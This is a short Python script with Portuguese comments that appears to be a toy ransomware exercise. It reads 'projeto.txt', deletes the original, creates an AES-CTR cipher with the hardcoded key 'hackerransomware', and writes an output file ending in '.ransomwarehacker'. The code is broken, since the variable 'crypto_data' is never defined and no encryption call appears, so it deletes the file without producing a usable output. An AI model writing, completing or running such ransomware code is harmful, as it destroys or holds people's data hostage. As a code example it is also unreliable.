import os

import pyaes

## abrir o arquivo a ser criptografado
file_name = "projeto.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"hackerransomware"
aes = pyaes.AESModeOfOperationCTR(key)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwarehacker"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

